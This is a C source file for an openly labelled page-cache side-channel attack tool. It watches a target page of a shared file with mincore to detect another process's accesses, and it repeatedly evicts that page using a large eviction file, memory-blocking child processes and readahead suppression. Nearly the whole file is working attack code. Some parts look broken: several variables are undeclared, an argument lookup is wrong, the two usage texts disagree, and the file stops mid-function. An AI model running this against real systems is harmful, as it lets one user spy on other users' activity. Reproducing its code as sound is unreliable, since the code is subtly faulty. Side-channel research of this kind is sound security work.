/*-----------------------------------------------------------------------------
 * main.c
 *
 * A program demonstrating the exploitation of a side channel based on
 * virtual memory and shared memory. To run this demo program you should have
 * swapping disabled.
 *
 * Usage: ./ev_chk [targets config file] <-s> <-e executable> <-t file>
 * 
 *  [targets config file]
 *      File containing the target pages from shared files to which accesses
 *      should be monitored.
 * 
 *  -s (optional)
 *      Collects statistics about eviction attempts as csv. 
 *      (accessed eviction memory -> "histogram_mem.csv", 
 *      eviction runtime -> "histogram_time.csv") 
 * 
 *  -e executable (optional) 
 *      Allows to specify an executable which is signaled in case of 
 *      an detected event (SIGUSR1).
 * 
 *  -t file (optional)
 *      Collects information about detected events as csv.
 *      (count, timestamp, eviction runtime, accessed eviction memory)
 *
 * Erik Kraft
 */

// needed to support additional features
#define _GNU_SOURCE
#define _DEFAULT_SOURCE

/*-----------------------------------------------------------------------------
 * INCLUDES
 */
#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <fts.h>
#include <memory.h>
#include <pthread.h>
#include <semaphore.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/statvfs.h>
#include <sys/sysinfo.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>
#include <wait.h>
#include <zconf.h>
#include <assert.h>
#include <limits.h>
#include "cmdline.h"
#include "config.h"
#include "pca.h"
#include "dynarray.h"
#include "list.h"
#include "pageflags.h"
#include "filemap.h"


/*-----------------------------------------------------------------------------
 * DEFINES
 */

// general defines
//#define _DEBUG_
//#define _DETAILED_EVICTION_SET_STAT_
// file names, paths
#define HISTOGRAM_FILENAME_TIME "histogram_time.csv"
#define HISTOGRAM_FILENAME_MEM "histogram_mem.csv"

// defines used for parsing command line arguments
#define SWITCHES_COUNT 3
#define STATISTIC_SWITCH 0
#define EXT_EVENT_APP_SWITCH 1
#define TRACE_SWITCH 2
const char *SWITCHES_STR[SWITCHES_COUNT] = {"-s", "-e", "-t"};
const size_t SWITCHES_ARG_COUNT[SWITCHES_COUNT] = {0, 1, 1};
#define MANDATORY_ARGS 2
#define TARGET_PATH_ARG 0
#define TARGET_OFFSET_ARG 1
#define USAGE_MSG "Usage: %s [target file] [page to watch] <-s> <-e executable> <-t file>\n\n" \
                  "\t[target file]\n"                                                          \
                  "\t\tThe shared file which contains the page to which accesses\n"            \
                  "\t\tshould be monitored.\n\n"                                               \
                  "\t[page to watch]\n"                                                        \
                  "\t\tThe file offset in pages of the target page.\n\n"                       \
                  "\t-s (optional)\n"                                                          \
                  "\t\tCollects statistics about eviction attempts as csv.\n"                  \
                  "\t\t(accessed eviction memory -> \"histogram_mem.csv\",\n"                  \
                  "\t\teviction runtime -> \"histogram_time.csv\")\n\n"                        \
                  "\t-e executable (optional)\n"                                               \
                  "\t\tAllows to specify an executable which is signaled in case of\n"         \
                  "\t\tan detected event (SIGUSR1).\n\n"                                       \
                  "\t-t file (optional)\n"                                                     \
                  "\t\tCollects information about detected events as csv.\n"                   \
                  "\t\t(count, timestamp, eviction runtime, accessed eviction memory)\n"

// inits/limits for data structures
#define ARRAY_INIT_CAP 10
#define IN_LINE_MAX 255

// output TAGS with ANSI colors
#define PENDING "\x1b[34;1m[PENDING]\x1b[0m "
#define INFO "\x1b[34;1m[INFO]\x1b[0m "
#define EVENT "\x1b[33;1m[EVENT]\x1b[0m "
#define OK "\x1b[32;1m[OK]\x1b[0m "
#define FAIL "\x1b[31;1m[FAIL]\x1b[0m "
#define USAGE "\x1b[31;1m[USAGE]\x1b[0m "
#define WARNING "\x1b[33;1m[WARNING]\x1b[0m "

// component TAGS
#define WS_MGR_TAG "[WS Manager] "
#define BS_MGR_TAG "[BS Manager] "
#define ES_THREAD_TAG "[ES Thread] "
#define SS_THREAD_TAG "[SS Thread] "


/*-----------------------------------------------------------------------------
 * MACROS
 */



/*-----------------------------------------------------------------------------
 * TYPE DEFINITIONS
 */


/*-----------------------------------------------------------------------------
 * FUNCTION PROTOTYPES
 */



// attack function related
void configAttack(Attack *attack);
int profileAttackWorkingSet(AttackWorkingSet *ws, char *target_obj_path, char *eviction_file_path);
int profileResidentPageSequences(CachedFile *current_cached_file, size_t ps_add_threshold);
int pageSeqCmp(void *node, void *data);
int blockRAM(AttackBlockingSet *bs, size_t fillup_size);
void releaseRAM(AttackBlockingSet *bs, size_t release_size);
void releaseRAMCb(void *addr, void *arg);
size_t evictTargetPage(Attack *attack);
int spawnESThreads(AttackEvictionSet *es, void *target_addr, size_t mincore_check_all_x_bytes);
void *pageAccessThreadES(void *arg);
void *bsManagerThread(void *arg);
size_t parseAvailableMem(char *meminfo_file_path);
void *wsManagerThread(void *arg);
void preparePageAccessThreadWSData(AttackWorkingSet *ws);
int reevaluateWorkingSet(AttackWorkingSet *ws);
int reevaluateWorkingSetList(List *cached_file_list, AttackWorkingSet *ws);
void *pageAccessThreadWS(void *arg);
int spawnSuppressThreads(Attack *attack, pthread_attr_t *thread_attr);
void *suppressThread(void *arg);
size_t getMappingCount(const unsigned char *status, size_t size_in_pages);
void usageError(char *app_name);


/*-----------------------------------------------------------------------------
 * GLOBAL VARIABLES
 */
static int running = 1;
static int eviction_running = 0;

static size_t PAGE_SIZE = 0;


/*-----------------------------------------------------------------------------
 * SIGNAL HANDLERS
 */
void quitHandler(int signal)
{
    // __ATOMIC_RELAXED = no thread ordering constraints
    __atomic_store_n(&running, 0, __ATOMIC_RELAXED);
}



/*-----------------------------------------------------------------------------
 * CODE
 */
int main(int argc, char *argv[])
{
    // general variables
    struct sysinfo system_info;
    struct sigaction quit_act = {0};
    int ret = 0;

    // variables used for processing command line arguments
    CmdLineConf cmd_line_conf =
    {
        .mandatory_args_count_ = MANDATORY_ARGS,
        .switches_count_ = SWITCHES_COUNT,
        .switches_ = SWITCHES_STR,
        .switches_arg_count_ = SWITCHES_ARG_COUNT
    };
    CmdLineParsed parsed_cmd_line;
    char *endptr = NULL;

    // variables used for statistics
    size_t mem_accessed = 0, event_mem_accessed = 0, mem_accessed_sum = 0;
    FILE *histogram_time_file = NULL, *histogram_mem_file = NULL, *trace_file = NULL;
    struct timespec eviction_start, eviction_end, unix_epoch;
    size_t elapsed_time_eviction_ns = 0, eviction_time_eviction_sum_ns = 0, event_eviction_time_ns = 0;
    size_t eviction_count = 0;
    size_t event_counter = 0, event_time = 0;

    // variables necessary for general attack function
    size_t target_offset = 0;
    char target_obj_path[PATH_MAX] = {0};
    char eviction_file_path[PATH_MAX] = {0};
    Attack attack = {0};
    FileMapping self_mapping = {0};
    unsigned char target_page_status;
    size_t event_hold = 0;
    pid_t event_child = 0;


    // set output buffering to lines (needed for automated testing)
    setvbuf(stdout, NULL, _IOLBF, 0);

    // process command line arguments
    if (parseCmdArgs(&argv[1], argc - 1, &cmd_line_conf, &parsed_cmd_line) != 0)
    {
        usageError(argv[0]);
        goto error;
    }

    // initialise random generator
    srand(time(NULL));

    // register signal handler for quiting the program by SRTG+C
    quit_act.sa_handler = quitHandler;
    ret = sigaction(SIGINT, &quit_act, NULL);
    ret += sigaction(SIGQUIT, &quit_act, NULL);
    ret += sigaction(SIGUSR1, &quit_act, NULL);
    if (ret != 0)
    {
        printf(FAIL "Error at registering signal handlers...\n");
        goto error;
    }

    // initialising attack structure
    if (initAttack(&attack) != 0)
    {
        printf(FAIL "Error at initialising attack configuration...\n");
        goto error;
    }

    // sample configuration
    configAttack(&attack);

    // get system information
    ret = sysinfo(&system_info);
    if (ret != 0)
    {
        printf(FAIL "Error (%s) at sysinfo...\n", strerror(errno));
        goto error;
    }
    printf(INFO "Total usable ram: %zu\n", system_info.totalram);

    // get system page size
    PAGE_SIZE = sysconf(_SC_PAGESIZE);
    if (PAGE_SIZE == -1)
    {
        printf(FAIL "Error (%s) at syscconf...\n", strerror(errno));
        goto error;
    }
    printf(INFO "System page size: %zu\n", PAGE_SIZE);

    // calculate target page offset in byte
    target_offset = strtoul(parsed_cmd_line.mandatory_args_[TARGET_OFFSET_ARG], &endptr, 10);
    if (endptr == parsed_cmd_line.mandatory_args_[TARGET_OFFSET_ARG] || *endptr != 0 ||
        (target_offset == ULONG_MAX && errno == ERANGE) || target_offset > ULONG_MAX / PAGE_SIZE)
    {
        usageError(argv[0]);
        goto error;
    }
    target_offset *= PAGE_SIZE;

    // optional: mlock self
    if (attack.mlock_self_)
    {
        // map self
        if (mapFile(&self_mapping, argv[0], O_RDONLY, PROT_READ | PROT_EXEC, MAP_PRIVATE) != 0)
        {
            printf(FAIL "Error (%s) at mapFile for: %s ...\n", strerror(errno), argv[0]);
            goto error;
        }

        // mlock self
        ret = mlock(self_mapping.addr_, self_mapping.size_);
        if (ret != 0)
        {
            printf(FAIL "Error (%s) at mlock: %s...\n", strerror(errno), argv[0]);
        }
    }

    // get access path of target object relative to root
    if (realpath(parsed_cmd_line.mandatory_args_[TARGET_PATH_ARG], target_obj_path) == NULL)
    {
        printf(FAIL "Error (%s) at realpath: %s...\n", strerror(errno),
               parsed_cmd_line.mandatory_args_[TARGET_PATH_ARG]);
        goto error;
    }
    // map target object
    if (mapFile(&attack.target_obj_, target_obj_path, O_RDONLY, PROT_READ, MAP_PRIVATE) != 0)
    {
        printf(FAIL "Error (%s) at mapFile for: %s ...\n", strerror(errno), target_obj_path);
        goto error;
    }

    // check if target page is out of bound
    if (target_offset > attack.target_obj_.size_)
    {
        printf(FAIL "Target page out of bound!\n");
        goto error;
    }
    printf(INFO "Target offset: %zx\n", target_offset);
    // save target page and address
    attack.target_page_ = target_offset / PAGE_SIZE;
    attack.target_addr_ = (uint8_t *)attack.target_obj_.addr_ + target_offset;

    // calcualte page addresses in near surrounding of the target page (for suppressing readahead)
    for (size_t p = attack.target_page_ < READAHEAD_PAGES ? 0 : attack.target_page_ - READAHEAD_PAGES;
         p < attack.target_page_; p++)
    {
        void *address = (uint8_t *)attack.target_obj_.addr_ + p * PAGE_SIZE;
        if (!dynArrayAppend(&attack.suppress_set_.target_readahead_window_, &address))
        {
            printf(FAIL "Error at dynArrayAppend...\n");
            goto error;
        }
    }

    // optional: map and mlock event binary
    if (parsed_cmd_line.switch_args_[EXT_EVENT_APP_SWITCH][0] != NULL)
    {
        // map event binary
        if (mapFile(&attack.event_obj_, parsed_cmd_line.switch_args_[EXT_EVENT_APP_SWITCH][0],
                    O_RDONLY, PROT_READ | PROT_EXEC, MAP_PRIVATE) != 0)
        {
            printf(FAIL "Error (%s) at mapFile for: %s ...\n", strerror(errno), parsed_cmd_line.switch_args_[EXT_EVENT_APP_SWITCH][0]);
            goto error;
        }

        ret = mlock(attack.event_obj_.addr_, attack.event_obj_.size_);
        if (ret != 0)
        {
            printf(FAIL "Error (%s) at mlock: %s...\n", strerror(errno), parsed_cmd_line.switch_args_[EXT_EVENT_APP_SWITCH][0]);
        }

        attack.event_child_ = fork();
        if (attack.event_child_ < 0)
        {
            printf(FAIL "Error (%s) at fork...\n", strerror(errno));
            goto error;
        }
        else if (attack.event_child_ == 0)
        {
            char *event_argv[] = {NULL};
            execv(parsed_cmd_line.switch_args_[EXT_EVENT_APP_SWITCH][0], event_argv);
            printf(FAIL "Error (%s) at execv: %s\n", strerror(errno), parsed_cmd_line.switch_args_[EXT_EVENT_APP_SWITCH][0]);
            goto error;
        }
    }

    // create statistic files if wanted
    if (parsed_cmd_line.switch_states_[STATISTIC_SWITCH])
    {
        // create histogram time data file
        histogram_time_file = fopen(HISTOGRAM_FILENAME_TIME, "w");
        if (histogram_time_file == NULL)
        {
            printf(FAIL "Error (%s) at fopen: %s...\n", strerror(errno), HISTOGRAM_FILENAME_TIME);
            goto error;
        }
        ret = fprintf(histogram_time_file, "Sample;Eviction duration (ns)\n");
        if (ret < 0)
        {
            printf(FAIL "Error (%s) at fprintf: %s...\n", strerror(errno), HISTOGRAM_FILENAME_TIME);
            goto error;
        }

        // create histogram mem data file
        histogram_mem_file = fopen(HISTOGRAM_FILENAME_MEM, "w");
        if (histogram_mem_file == NULL)
        {
            printf(FAIL "Error (%s) at fopen: %s...\n", strerror(errno), HISTOGRAM_FILENAME_MEM);
            goto error;
        }
        ret = fprintf(histogram_mem_file, "Sample;Used eviction set (kB)\n");
        if (ret < 0)
        {
            printf(FAIL "Error (%s) at fprintf: %s...\n", strerror(errno), HISTOGRAM_FILENAME_MEM);
            goto error;
        }
    }

    // create trace file
    if (parsed_cmd_line.switch_args_[TRACE_SWITCH][0] != NULL)
    {
        trace_file = fopen(parsed_cmd_line.switch_args_[TRACE_SWITCH][0], "w");
        if (trace_file == NULL)
        {
            printf(FAIL "Error (%s) at fopen: %s...\n", strerror(errno), parsed_cmd_line.switch_args_[TRACE_SWITCH][0]);
            goto error;
        }
        ret = fprintf(trace_file,
                      "Target object: %s\nTarget page: %zu\n"
                      "Event count;Time (ns);Eviction duration (ns);Used eviction set (kB)\n",
                      target_obj_path, target_offset / PAGE_SIZE);
        if (ret < 0)
        {
            printf(FAIL "Error (%s) at fprintf: %s...\n", strerror(errno), parsed_cmd_line.switch_args_[TRACE_SWITCH][0]);
            goto error;
        }
    }

    // create eviction file if it doesn't exist
    printf(PENDING "Trying to create a %zu MB random file.\nThis might take a while...\n", system_info.totalram / 1024 / 1024);
    ret = createRandomFile(EVICTION_FILENAME, system_info.totalram);
    if (ret != 0)
    {
        printf(FAIL "Error(%s) at createRandomFile...\n", strerror(errno));
        goto error;
    }

    // get access path of eviction file relative to root
    if (realpath(parsed_cmd_line.mandatory_args_[EVICTION_FILENAME], eviction_file_path) == NULL)
    {
        printf(FAIL "Error (%s) at realpath: %s...\n", strerror(errno),
               parsed_cmd_line.mandatory_args_[EVICTION_FILENAME]);
        goto error;
    }
    // map eviction file
    if (mapFile(&attack.eviction_set_.mapping_, EVICTION_FILENAME, O_RDONLY, PROT_READ | PROT_EXEC, MAP_PRIVATE) != 0)
    {
        printf(FAIL "Error (%s) at mapFile for: %s ...\n", strerror(errno), EVICTION_FILENAME);
        goto error;
    }

    printf(PENDING "Initialising...\n");
    if (attack.use_attack_ws_)
    {
        printf(PENDING "Profiling working set...\n");
        if (profileAttackWorkingSet(&attack.working_set_, target_obj_path, eviction_file_path) != 0)
        {
            printf(FAIL "Error at profileAttackWorkingSet...\n");
            goto error;
        }

        printf(INFO "%zu files with %zu mapped bytes of sequences bigger than %zu pages are currently resident in memory.\n",
               attack.working_set_.resident_files_.count_, attack.working_set_.mem_in_ws_, attack.working_set_.ps_add_threshold_);
    }

// if wanted use eviction threads
#ifdef ES_USE_THREADS
    if (spawnESThreads(&attack.eviction_set_, attack.target_addr_, attack.mincore_check_all_x_bytes_) != 0)
    {
        printf(FAIL "Error at spawnESThreads...\n");
        goto error;
    }
#endif

    // next thread(s) by default on different core
    CPU_ZERO(&cpu_mask);
    CPU_SET(used_pus, &cpu_mask);
    pthread_attr_setaffinity_np(&thread_attr, sizeof(cpu_set_t), &cpu_mask);
    used_pus = (used_pus + PU_INCREASE < MAX_PUS) ? used_pus + PU_INCREASE : used_pus;

    // spawn surpressing set worker threads
    if (spawnSuppressThreads(&attack, &thread_attr) != 0)
    {
        printf(FAIL "Error at spawnSSThreads...\n");
        goto error;
    }

    // manager for working set
    if (attack.use_attack_ws_ && pthread_create(&attack.ws_manager_thread_, &thread_attr, wsManagerThread, &attack.working_set_) != 0)
    {
        printf(FAIL "Error (%s) at pthread_create...\n", strerror(errno));
    }

    // manager for blocking set
    if (attack.use_attack_bs_)
    {
        if (pthread_create(&attack.bs_manager_thread_, &thread_attr, bsManagerThread, &attack.blocking_set_) != 0)
        {
            printf(FAIL "Error (%s) at pthread_create...\n", strerror(errno));
        }
        else
        {
            // wait till blocking set is initialized
            sem_wait(&attack.blocking_set_.initialized_sem_);
        }
    }

    printf(OK "Ready...\n");
    // main event loop
    while (running)
    {
        if (mincore(attack.target_addr_, PAGE_SIZE, &target_page_status) != 0)
        {
            printf(FAIL "Error (%s) at mincore...\n", strerror(errno));
            continue;
        }

        if (clock_gettime(CLOCK_REALTIME, &unix_epoch) != 0)
        {
            printf(FAIL "Error (%s) at clock_gettime...\n", strerror(errno));
        }

        // event detected
        if (target_page_status & 1)
        {
            if (!event_hold)
            {
                event_hold = 1;
                event_eviction_time_ns = 0;
                event_mem_accessed = 0;
                event_counter++;

                printf(EVENT "%zu. event fired! Unix epoch timestamp: %zu s %zu us\n", event_counter, unix_epoch.tv_sec,
                       unix_epoch.tv_nsec / 1000);

                // send signal to event process
                if (event_child != 0)
                {
                    nanosleep(&attack.event_wait_time_, NULL);

                    if (kill(event_child, SIGUSR1) != 0)
                    {
                        printf(FAIL "Error (%s) at signaling event process...\n", strerror(errno));
                    }

                    sched_yield();
                }
            }

            // trying to evict
            ret = clock_gettime(CLOCK_MONOTONIC, &eviction_start);
            mem_accessed = evictTargetPage(&attack);
            ret += clock_gettime(CLOCK_MONOTONIC, &eviction_end);

            if (ret != 0)
            {
                printf(FAIL "Error (%s) at clock_gettime...\n", strerror(errno));
            }
            else
            {
                // eviction time of single try
                elapsed_time_eviction_ns = (eviction_end.tv_sec - eviction_start.tv_sec) * 1000000000UL +
                                           (eviction_end.tv_nsec - eviction_start.tv_nsec);
                // sum of all evivtion times
                eviction_time_eviction_sum_ns += elapsed_time_eviction_ns;
                // eviction time per event
                event_eviction_time_ns += elapsed_time_eviction_ns;
                // sum of all accessed memory 
                mem_accessed_sum += mem_accessed;
                // accessed memory per event
                event_mem_accessed += mem_accessed;

                DEBUG_PRINT((DEBUG "Accessed approx. %zu kB of eviction memory (elapsed time %zu)..\n",
                             mem_accessed / 1024, elapsed_time_eviction_ns));

                // write statistical data
                if (parsed_cmd_line.switch_states_[STATISTIC_SWITCH])
                {
                    fprintf(histogram_time_file, "%zu;%zu\n", eviction_count, elapsed_time_eviction_ns);
                    fprintf(histogram_mem_file, "%zu;%zu\n", eviction_count, mem_accessed / 1024);
                }
            }

            eviction_count++;
        }
        else if (!(target_page_status & 1) && event_hold)
        {
            printf(EVENT "Released (eviction took %zu us, accessed %zu kB)\n\n", event_eviction_time_ns / 1000,
                   event_mem_accessed / 1024);

            if (parsed_cmd_line.switch_states_[TRACE_SWITCH])
            {
                fprintf(trace_file, "%zu;%zu;%zu;%zu\n", event_counter, event_time, event_eviction_time_ns, event_mem_accessed / 1024);
            }

            event_hold = 0;
        }

        sched_yield();
    }

    if (event_counter > 0)
    {
        printf(INFO "Mean time to eviction per event: %f ns..\n", (double)eviction_time_eviction_sum_ns / event_counter);
        printf(INFO "Mean accessed eviction set per event: %f kB..\n", (double)mem_accessed_sum / 1024 / event_counter);
    }

    goto cleanup;

error:
    ret = -1;

cleanup:

    pthread_attr_destroy(&thread_attr);

    exitAttack(&attack);
    if (attack.mlock_self_)
    {
        closeFileMapping(&self_mapping);
    }

    if (trace_file != NULL)
    {
        fclose(trace_file);
    }
    if (histogram_time_file != NULL)
    {
        fclose(histogram_time_file);
    }
    if (histogram_mem_file != NULL)
    {
        fclose(histogram_mem_file);
    }

    freeCmdLineParsed(&cmd_line_conf, &parsed_cmd_line);

    return ret;
}






int blockRAM(AttackBlockingSet *bs, size_t fillup_size)
{
    int ret = 0;
    FillUpProcess child_process;
    void *fillup_mem = NULL;
    sem_t *sem = MAP_FAILED;
    size_t needed_childs = 0;

    // init child structure
    initFillUpProcess(&child_process);
    child_process.fillup_size_ = bs->def_fillup_size_;

    // create a shared semaphore
    sem = mmap(NULL, sizeof(sem_t), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (sem == MAP_FAILED)
    {
        printf(FAIL BS_MGR_TAG "Error (%s) at mmap...\n", strerror(errno));
        goto error;
    }
    if (sem_init(sem, 1, 0))
    {
        printf(FAIL BS_MGR_TAG "Error (%s) at sem_init...\n", strerror(errno));
        goto error;
    }

    // round down
    needed_childs = fillup_size / bs->def_fillup_size_;
    for (size_t i = 1; i <= needed_childs; i++)
    {
        child_process.pid_ = fork();

        if (child_process.pid_  < 0)
        {
            // parent
            printf(FAIL BS_MGR_TAG "Error (%s) at fork for block ram child..\n", strerror(errno));
            goto error;
        }
        else if (child_process.pid_ == 0)
        {
            // child
            DEBUG_PRINT((DEBUG BS_MGR_TAG "New child %zu with %zu kB dirty memory will be spawned...\n", 
                i, bs->def_fillup_size_ / 1024));

            fillup_mem = mmap(
                NULL, bs->def_fillup_size_, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);

            if (fillup_mem == MAP_FAILED)
            {
                if (sem_post(sem) != 0)
                {
                    printf(FAIL BS_MGR_TAG "Error (%s) at sem_post...\n", strerror(errno));
                }

                printf(FAIL BS_MGR_TAG "Error (%s) mmap..\n", strerror(errno));
                exit(-1);
            }

            // write to fillup memory (unique contents -> no page deduplication)
            for (size_t m = 0; m < bs->def_fillup_size_; m += PAGE_SIZE)
            {
                *((size_t *)((uint8_t *)fillup_mem + m)) = i * m;
            }

            // finished
            if (sem_post(sem) != 0)
            {
                printf(FAIL BS_MGR_TAG "Error (%s) at sem_post...\n", strerror(errno));
                exit(-1);
            }

            while (1)
            {
                // wait for signal
                pause();
            }
        }

        // parent
        // wait until child process has finished
        if (sem_wait(sem))
        {
            printf(FAIL BS_MGR_TAG "Error (%s) at sem_wait...\n", strerror(errno));
            goto error;
        }

        // error at dynArrayAppend <=> child could not be added
        if (!dynArrayAppend(&bs->fillup_processes_, &child_process))
        {
            printf(FAIL BS_MGR_TAG "Error (%s) at dynArrayAppend...\n", strerror(errno));
            goto error;
        }
    }
    printf(INFO BS_MGR_TAG "Blocked %zu kB...\n", needed_childs * bs->def_fillup_size_ / 1024);

    goto cleanup;
error:
    ret = -1;
    // kill rouge child if existing
    if(child_process.pid_ > 0)
    {
        kill(child_process.pid_, SIGKILL);
    }

cleanup:
    if(sem != MAP_FAILED)
    {
        sem_destroy(sem);
        munmap(sem, sizeof(sem_t));
    }

    return ret;
}

void pcaConfigFromDefines(Attack *attack)
{
    // configure attack from defines
    attack->use_attack_ws_ |= DEF_USE_ATTACK_WS;
    attack->use_attack_bs_ |= DEF_USE_ATTACK_BS;
    attack->mlock_self_ |= DEF_MLOCK_SELF;

    // only used if ES_USE_THREADS is defined
    attack->eviction_set_.access_thread_count_ = DEF_ES_ACCESS_THREAD_COUNT;
    attack->eviction_set_.access_threads_per_pu_ = DEF_ES_ACCESS_THREADS_PER_PU;

    attack->working_set_.evaluation_ |= DEF_WS_EVALUATION;
    attack->working_set_.eviction_ignore_evaluation_ |= DEF_WS_EVICTION_IGNORE_EVALUATION;
    attack->working_set_.search_paths_ = DEF_WS_SEARCH_PATHS;
    attack->working_set_.ps_add_threshold_ = DEF_WS_PS_ADD_THRESHOLD;
    attack->working_set_.access_thread_count_ = DEF_WS_ACCESS_THREAD_COUNT;
    attack->working_set_.access_threads_per_pu_ = DEF_WS_ACCESS_THREADS_PER_PU;
    attack->working_set_.access_sleep_time_.tv_sec = DEF_WS_ACCESS_SLEEP_TIME_S;
    attack->working_set_.access_sleep_time_.tv_nsec = DEF_WS_ACCESS_SLEEP_TIME_NS;
    attack->working_set_.evaluation_sleep_time_.tv_sec = DEF_WS_EVALUATION_SLEEP_TIME_S;
    attack->working_set_.evaluation_sleep_time_.tv_nsec = DEF_WS_EVALUATION_SLEEP_TIME_NS;
    attack->working_set_.profile_update_all_x_evaluations_ = DEF_WS_PROFILE_UPDATE_ALL_X_EVALUATIONS;

    attack->mincore_check_all_x_bytes_ = DEF_MINCORE_CHECK_ALL_X_BYTES;

    attack->blocking_set_.meminfo_file_path_ = DEF_BS_MEMINFO_FILE_PATH;
    attack->blocking_set_.def_fillup_size_ = DEF_BS_FILLUP_SIZE;
    attack->blocking_set_.min_available_mem_ = DEF_BS_MIN_AVAILABLE_MEM;
    attack->blocking_set_.max_available_mem_ = DEF_BS_MAX_AVAILABLE_MEM;
    attack->blocking_set_.evaluation_sleep_time_.tv_sec = DEF_BS_EVALUATION_SLEEP_TIME_S;
    attack->blocking_set_.evaluation_sleep_time_.tv_nsec = DEF_BS_EVALUATION_SLEEP_TIME_NS;

    attack->ss_thread_count_ = DEF_SS_THREAD_COUNT;

    attack->sample_wait_time_.tv_sec = 0;
    attack->sample_wait_time_.tv_nsec = DEF_SAMPLE_WAIT_TIME_NS;
    attack->event_wait_time_.tv_sec = 0;
    attack->event_wait_time_.tv_nsec = DEF_EVENT_WAIT_TIME_NS;
}

void releaseRAM(AttackBlockingSet *bs, size_t release_size)
{
    size_t released = 0;
    size_t released_sum = 0;

    DEBUG_PRINT((DEBUG BS_MGR_TAG "Trying to release %zu kB of blocking memory\n", release_size / 1024));

    while (released_sum < release_size && bs->fillup_processes_.size_ > 0)
    {
        dynArrayPop(&bs->fillup_processes_, releaseRAMCb, &released);
        released_sum += released;
    }
    printf(INFO BS_MGR_TAG "Released %zu kB...\n", released_sum / 1024);
}


void releaseRAMCb(void *addr, void *arg)
{
    FillUpProcess *fp = addr;
    size_t *released = arg;

    kill(fp->pid_, SIGKILL);
    *released = fp->fillup_size_;
}


#ifdef ES_USE_THREADS

size_t evictTargetPage(Attack *attack)
{
    size_t accessed_mem_sum = 0;

    // flag eviction running
    __atomic_store_n(&eviction_running, 1, __ATOMIC_RELAXED);

    // resume worker threads
    for (size_t t = 0; t < attack->eviction_set_.access_thread_count_; t++)
    {
        // in case of error skip
        if (sem_post(&attack->eviction_set_.worker_start_sem_) != 0)
        {
            printf(WARNING "Error (%s) at sem_post...\n", strerror(errno));
            continue;
        }
    }

    // wait for completion of the worker threads
    for (size_t t = 0; t < attack->eviction_set_.access_thread_count_; t++)
    {
        // in case of error skip
        if (sem_wait(&attack->eviction_set_.worker_join_sem_) != 0)
        {
            printf(WARNING "Error (%s) at sem_wait...\n", strerror(errno));
            continue;
        }

        PageAccessThreadESData *thread_data = dynArrayGet(&attack->eviction_set_.access_threads_, t);
        accessed_mem_sum += thread_data->accessed_mem_;
    }

    // flag eviction done
    __atomic_store_n(&eviction_running, 0, __ATOMIC_RELAXED);

    return accessed_mem_sum;
}

#else

size_t evictTargetPage(Attack *attack)
{
    volatile uint8_t tmp = 0;
    (void)tmp;
    ssize_t accessed_mem = 0;
    unsigned char target_page_status = 1;

    // more aggressive readahead (done before), here experimentally
    // posix_fadvise(attack->eviction_set_.mapping_.fd_, 0, DEF_BS_MIN_AVAILABLE_MEM, POSIX_FADV_WILLNEED);
    // madvise(attack->eviction_set_.mapping_.addr_, DEF_BS_MIN_AVAILABLE_MEM, MADV_WILLNEED);

    // flag eviction running
    __atomic_store_n(&eviction_running, 1, __ATOMIC_RELAXED);

#ifdef _DETAILED_EVICTION_SET_STAT_
    struct timespec access_start, access_end;
    size_t already_resident = 0;
    size_t t_access = 0;
    size_t t_resident = 0;
    size_t t_non_resident = 0;
#endif

    // access attack eviction set pages, bulk reading ahead using read was tested
    //lseek(attack->eviction_set_.mapping_.fd_, 0, SEEK_SET);
    for (size_t p = 0; p < attack->eviction_set_.mapping_.size_pages_; p++)
    {
        if (accessed_mem % attack->mincore_check_all_x_bytes_ == 0)
        {
            // check if target page was evicted
            if (mincore(attack->target_addr_, PAGE_SIZE, &target_page_status) != 0)
            {
                // in case of error just print warnings and access whole ES
                printf(WARNING "Error (%s) at mincore...\n", strerror(errno));
            }
            else if (!(target_page_status & 1))
            {
                break;
            }

            // advise to pre read next block (trying to optimise I/O requests, default readahead of linux is 32 pages)
            // did not prove to help, except for the first calls, as bottleneck is NOT reading but rather the page replacement mechanism
            /*if(madvise((uint8_t *) attack->eviction_set_.mapping_.addr_ + p * PAGE_SIZE, attack->mincore_check_all_x_bytes_, MADV_WILLNEED) < 0) 
            {
               printf(FAIL "Error (%s) at madvise...\n", strerror(errno)); 
            }*/
        }

#ifdef _DETAILED_EVICTION_SET_STAT_

        clock_gettime(CLOCK_MONOTONIC, &access_start);
#ifdef ES_USE_PREAD
        if (pread(attack->eviction_set_.mapping_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
        {
            // in case of error just print warnings and access whole ES
            printf(WARNING "Error (%s) at pread...\n", strerror(errno));
        }
#ifdef PREAD_TWO_TIMES
        if (pread(attack->eviction_set_.mapping_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
        {
            // in case of error just print warnings and access whole ES
            printf(WARNING "Error (%s) at pread...\n", strerror(errno));
        }
#endif
#else
        tmp = *((uint8_t *)attack->eviction_set_.mapping_.addr_ + p * PAGE_SIZE);
#endif
        clock_gettime(CLOCK_MONOTONIC, &access_end);

        // calculate
        t_access = (access_end.tv_sec - access_start.tv_sec) * 1000000000UL + access_end.tv_nsec - access_start.tv_nsec;
        if (t_access < RAM_HIT_THRESHOLD)
        {
            already_resident++;
            t_resident += t_access;
        }
        else
        {
            t_non_resident += t_access;
            //printf("Timestamp: %zu\n duration: %zu ns\n", access_start.tv_sec * 1000000000UL + access_start.tv_nsec, t_access);
        }

#else
#ifdef ES_USE_PREAD
        if (pread(attack->eviction_set_.mapping_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
        {
            // in case of error just print warnings and access whole ES
            printf(WARNING "Error (%s) at pread...\n", strerror(errno));
        }
#ifdef PREAD_TWO_TIMES
        if (pread(attack->eviction_set_.mapping_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
        {
            // in case of error just print warnings and access whole ES
            printf(WARNING "Error (%s) at pread...\n", strerror(errno));
        }
#endif
#else
        tmp = *((uint8_t *)attack->eviction_set_.mapping_.addr_ + p * PAGE_SIZE);
#endif
#endif
        accessed_mem += PAGE_SIZE;
    }

    // flag eviction done
    __atomic_store_n(&eviction_running, 0, __ATOMIC_RELAXED);

#ifdef _DETAILED_EVICTION_SET_STAT_
